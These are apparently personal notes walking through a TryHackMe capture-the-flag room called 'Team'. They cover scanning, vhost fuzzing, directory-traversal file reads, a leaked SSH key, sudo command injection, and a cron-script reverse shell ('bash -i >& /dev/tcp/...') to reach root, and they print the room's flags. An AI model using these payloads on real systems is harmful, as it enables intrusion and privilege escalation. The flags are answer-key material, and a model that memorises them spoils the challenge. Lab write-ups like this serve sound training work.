### Nmap

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 795f116a85c20824306cd488741b794d (RSA)
|   256 af7e3f7eb4865883f1f6a254a69bbaad (ECDSA)
|_  256 2625b07bdc3fb29437125dcd0698c79f (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works! If you see this add 'te...
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

```
─[glack@parrot]─[~]
└──╼ $nmap -T5 -p- --min-rate=10000 10.10.165.123

PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

### FTP

- ftp anonymous login not allowed

### HTTP

- this finds nothing
```
feroxbuster -u http://10.10.165.123/ -w /usr/share/wordlists/common.txt -x html,php -n


feroxbuster -u http://10.10.165.123/ -w /usr/share/wordlists/small.txt -x html,php -n
```

- will continue again this tomorrow

maybe nmap again with UDP flag? - rran the command and it was taking more than 30 minutes

- 10/09/23 - now trying again with
```
─[glack@parrot]─[~/Desktop/THM/badbyte]
└──╼ $feroxbuster -u http://10.10.76.112/ -w /usr/share/wordlists/small.txt -x html,php,txt -n
```

found nothing

- this also finds nothing

```
┌─[✗]─[glack@parrot]─[~/Desktop/THM/badbyte]
└──╼ $feroxbuster -u http://10.10.76.112/ -w /usr/share/wordlists/medium.txt -x html,php -n
    
```


after finding nothing went for the writeup


- missed this in the source code of index.html
```
pache2 Ubuntu Default Page: It works! If you see this add 'team.thm' to your hosts!</title>
```

- added this to my hosts file and ran ferox
```
   │   ~ ▓▒░ feroxbuster -u http://team.thm/ -w /usr/share/wordlists/small.txt -n -x html,php
```

also read a hint in the writeup about `vhosts`


used [[Vhost Fuzzing]] to and ran this command


```
   │   ~ ▓▒░ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://team.thm/ -H 'Host: FUZZ.team.thm' -fs 11366
```

and i get this

```
www.dev                 [Status: 200, Size: 187, Words: 20, Lines: 10, Duration: 132ms]
www                     [Status: 200, Size: 2966, Words: 140, Lines: 90, Duration: 1432ms]
dev                     [Status: 200, Size: 187, Words: 20, Lines: 10, Duration: 3448ms]
```

- hint suggests to perform directory traversal attack 
```
As the "dev" site is under contruction maybe it has some flaws? "url?=" + "This rooms picture"
```

as `dev.team.thm` returns nothing


- `http://team.thm/robots.txt` this give `dale` , dont know what this means yet

- i forgot the to add the vhosts to `/etc/hosts`, added it

and visited the `http://dev.team.thm`, there i was redirected to (After clicking the link)


### Shell


`http://dev.team.thm/script.php?page=teamshare.php`, used the hint and got this one to be successfull

`http://dev.team.thm/script.php?page=teamshare.php../../../../../etc/passwd`


- checked for this `http://dev.team.thm/script.php?page=teamshare.php../../../../../home/dale/user.txt` and got  a response `THM{6Y0TXHz7c2d}`

- `/etc/passwd` confirms two users
`dale:x:1000:1000:anon,,,:/home/dale:/bin/bash gyles:x:1001:1001::/home/gyles`



- LFI [[LFI - directory traversal - to RCE]] 

used writeup for this - we can get fuzz the filepath 
using
`SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt`

and get this `sshd_config` file contents `/etc/ssh/sshd_config`

- this file had the private rsa key of user dale

copied the contents and while logging in got an error of incorrect syntax, reached the file and it still had hashtags in it. i replace the hashtags but still got the same error

```
   │   ~/Desktop/THM/team ▓▒░ ssh dale@10.10.117.176 -i id_rsa                                         ░▒▓ ✔ │ 18s   │ 00:39:26   
Load key "id_rsa": invalid format
dale@10.10.117.176's password: 
```


`cat the-key | tr -d '#' > id_rsa` used this but still got an invalid format error

followed this, entered after the last line
`should speed this up), chmod it to 600, and use it to connect as dale (if ssh complains about the formatting of the key, make sure you've removed the first line, all of the comment symbols, and that the file ends with an empty line) :`


we have shell as dale

```
dale@TEAM:~$ id
```

### Priv Esc
- found this note 
```
dale@TEAM:/home/ftpuser/workshare$ cat New_site.txt 
Dale

	I have started coding a new website in PHP for the team to use, this is currently under development. It can be
found at ".dev" within our domain.

Also as per the team policy please make a copy of your "id_rsa" and place this in the relevent config file.

Gyles
```

- we find this in `sudo -l`
```
dale@TEAM:/home/gyles$ sudo -l
Matching Defaults entries for dale on TEAM:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dale may run the following commands on TEAM:
    (gyles) NOPASSWD: /home/gyles/admin_checks
```

[[Sudo - as a different user]]

- used this command to run the file as `gyles`
```
dale@TEAM:/home/gyles$ sudo -u gyles /home/gyles/admin_checks
```

- in the date promt we get a RCE as gyles
```
Enter 'date' to timestamp the file: id
The Date is uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),1003(editors),1004(admin)
Stats have been backed up
```

- this gives us shell as gyles
```
Enter 'date' to timestamp the file: /bin/bash
```

- in the contents of `admin_checks` i can see this
```
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak
```

bianry `cp` is running without full path. I had solved this priv esc in a machine before [[Archangel]]


this did not work so used the writeup
https://github.com/BJConway/thm_writeups/blob/main/challenges/team.md

- we had to find all the files owner by an `admin` group using
```
find / -group admin 2>/dev/null
```

we get this 

```
find / -group admin -ls 2>/dev/null
   391594      4 drwxrwxr-x   2 root     admin        4096 Jan 17  2021 /usr/local/bin
   
   395905      4 -rwxrwxr-x   1 root     admin          65 Jan 17  2021 /usr/local/bin/main_backup.sh
   
    24326      4 drwxrwx---   2 root     admin        4096 Jan 17  2021 /opt/admin_stuff
```

- in `/opt/admin_stuff` we find this script with the content

```
#I have set a cronjob to run this script every minute


dev_site="/usr/local/sbin/dev_backup.sh"
main_site="/usr/local/bin/main_backup.sh"
#Back ups the sites locally
$main_site
$dev_site
pwd

```

we do not have write permissions for this

also not for this

```
ls -al /usr/local/sbin/dev_backup.sh
-rwxr-xr-x 1 root root 64 Jan 17  2021 /usr/local/sbin/dev_backup.sh
```

but we have write permission since we are in admin group

```
ls -al /usr/local/bin/main_backup.sh
-rwxrwxr-x 1 root admin 65 Jan 17  2021 /usr/local/bin/main_backup.sh
```

- added this to the file
```
echo "bash -i >& /dev/tcp/10.17.24.189/9999 0>&1" >> main_backup.sh
```

waited for a min and got root shell

```
root@TEAM:~# id
id
uid=0(root) gid=0(root) groups=0(root),1004(admin)
```
and the flag

```
root@TEAM:~# cat root.txt
cat root.txt
THM{fhqbznavfonq}
```
